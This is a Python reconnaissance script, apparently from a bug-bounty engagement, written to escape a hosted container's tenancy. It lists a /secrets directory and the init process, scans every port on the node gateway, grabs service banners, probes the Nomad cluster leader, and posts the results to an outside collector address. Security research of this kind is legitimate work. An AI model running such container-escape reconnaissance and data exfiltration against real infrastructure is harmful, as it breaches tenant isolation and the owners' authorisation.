#!/usr/bin/env python3
"""probe11 - what else does the node expose, and is the Nomad leader reachable?

probe10 established the hop exists but is ACL-gated: /v1/agent/self -> 403, while /v1/status/leader ->
200 naming the cluster leader at [2600:1f16:1527:3700:e5b8:c049:c8c1:3215]:4647 (a *public* AWS IPv6).
The chain needs a credential. Before concluding the token is unobtainable, enumerate what the node
gateway actually offers - a container runtime socket or a metrics/agent endpoint that leaks more than
Nomad's ACL allows - and test whether the leader's API is reachable at all from here.

Bound: ports and banners only. Nothing that touches another tenant's allocation, no credential attempts.
"""
from __future__ import annotations

import json
import os
import socket
import ssl
import struct
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from http.server import BaseHTTPRequestHandler, HTTPServer

COLLECTOR = "http://208.87.134.252:9200/rt11"
NODE = "169.254.1.2"
NODE_ULA = "fda7:a938:5bfe:5fa6:0:5e9:67ef:f8d"
LEADER = "2600:1f16:1527:3700:e5b8:c049:c8c1:3215"
UA = "aiven-bugbounty/1.0 (Bugcrowd-zllr; researcher: zllr)"
RESULTS = {"stage": "init", "open": {}, "identify": {}, "leader": {}, "facts": {}}
LOCK = threading.Lock()


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(RESULTS, indent=1).encode())

    def log_message(self, *a):
        pass


threading.Thread(target=lambda: HTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8080"))), H).serve_forever(),
                 daemon=True).start()
time.sleep(2)
RESULTS["facts"] = {
    "id": os.popen("id 2>&1 | head -2").read().strip(),
    "enforce": os.popen("getenforce 2>&1").read().strip(),
    "secrets_z": os.popen("ls -Z /secrets/ 2>&1 | head -8").read().strip(),
    "proc1": os.popen("tr '\\0' ' ' < /proc/1/cmdline 2>/dev/null | head -c 200").read().strip(),
}


def tcp(host, port, timeout=1.0):
    fam = socket.AF_INET6 if ":" in host else socket.AF_INET
    s = socket.socket(fam, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        s.close()
        return {"state": "open"}
    except socket.timeout:
        return {"state": "timeout"}
    except OSError as e:
        return {"state": type(e).__name__}
    finally:
        try:
            s.close()
        except Exception:                                               # noqa: BLE001
            pass


def probe_port(port):
    r = tcp(NODE, port)
    if r["state"] != "open":
        return
    with LOCK:
        RESULTS["open"][port] = r["state"]
    RESULTS["identify"][port] = identify(NODE, port)


def identify(host, port):
    try:
        s = socket.socket(socket.AF_INET if ":" not in host else socket.AF_INET6, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, port))
        try:
            s.sendall(("GET / HTTP/1.0\r\nHost: %s\r\nUser-Agent: %s\r\nX-Security-Testing: @zllr\r\n\r\n"
                       % (host, UA)).encode())
        except Exception:                                               # noqa: BLE001
            pass
        d = s.recv(300)
        s.close()
        return d.decode("latin1", "replace")[:220] if d else "(connected, silent)"
    except Exception as e:                                              # noqa: BLE001
        return "identify-err %s: %s" % (type(e).__name__, str(e)[:50])


# full-range scan of the node gateway: local RTT, refusals return instantly
RESULTS["stage"] = "scanning node"
with ThreadPoolExecutor(max_workers=96) as ex:
    list(ex.map(probe_port, range(1, 65536)))

# the leader named by /v1/status/leader: is the control plane reachable from here at all?
RESULTS["stage"] = "leader"
for port in (4646, 4647):
    r = tcp(LEADER, port, timeout=4)
    RESULTS["leader"]["%s:%d" % (LEADER, port)] = r
    if r["state"] == "open":
        RESULTS["leader"]["%s:%d-ident" % (LEADER, port)] = identify(LEADER, port)

RESULTS["stage"] = "done"
RESULTS["finished"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
body = json.dumps(RESULTS)
try:
    import urllib.request
    urllib.request.urlopen(urllib.request.Request(COLLECTOR, data=body.encode(),
                                                  headers={"Content-Type": "application/json"}), timeout=25)
except Exception as e:                                                  # noqa: BLE001
    print("collector post failed:", e)
print(json.dumps(RESULTS)[:3000])
while True:
    time.sleep(60)
